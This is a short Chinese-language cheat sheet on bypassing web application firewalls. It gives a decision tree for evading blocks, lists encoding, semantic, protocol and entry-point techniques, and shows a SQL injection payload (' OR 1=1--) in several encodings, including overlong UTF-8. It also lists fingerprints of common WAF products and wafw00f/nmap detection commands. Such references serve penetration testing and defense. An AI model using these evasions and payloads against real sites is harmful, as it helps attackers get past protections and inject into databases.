# WAF 绕过完整手册

> 263 种绕过变体，按维度分类。被拦了来这里找。

## 绕过决策树

```
Payload 被拦
 ├─ 看返回是 WAF？应用？
 │   ├─ WAF 拦 → 协议层绕过（HPP/Chunked/大小写/Content-Type）
 │   └─ 应用拦 → 编码层/语义层（双写/注释/等价函数）
 ├─ 看是黑名单还是白名单
 │   ├─ 黑名单 → 找漏掉的关键字/同义词
 │   └─ 白名单 → 找白名单允许的危险用法
 └─ 看是输入过滤还是输出编码
     ├─ 输入过滤 → 多重编码/二次注入
     └─ 输出编码 → 上下文逃逸
```

## 通用绕过

```
编码层: URL编码 → 双重编码 → HTML实体 → Unicode → UTF-8超长 → 混合编码
语义层: 大小写 → 注释插入 → 双写 → 等价函数 → 等价操作符
协议层: HPP → Chunked → Content-Type混淆 → HTTP方法覆盖 → 重复Header
入口层: Header注入 → Cookie注入 → JSON注入 → 二次注入 → 冷门参数
```

## 编码梯度

```
原始: ' OR 1=1--
URL编码: %27%20OR%201%3D1--
双重URL: %2527%2520OR%25201%253D1--
Unicode: %u0027 OR 1=1--
UTF-8超长: %c0%a7 OR 1=1-- (超长表示')
混合: %27%20OR%20%31%3D%31--
```

## 常见 WAF 指纹

```
Cloudflare: cf-ray header, 403/503 block page
AWS WAF: X-Amzn-RequestId, 403
ModSecurity: 406 Not Acceptable, 403
阿里云WAF: 405, X-WAF-Error
长亭雷池: 特殊block page
```

## WAF 识别命令

```bash
wafw00f https://target.com
nmap -p 443 --script http-waf-detect {target}
# 手工: 发送恶意payload → 看响应头/状态码/body特征
```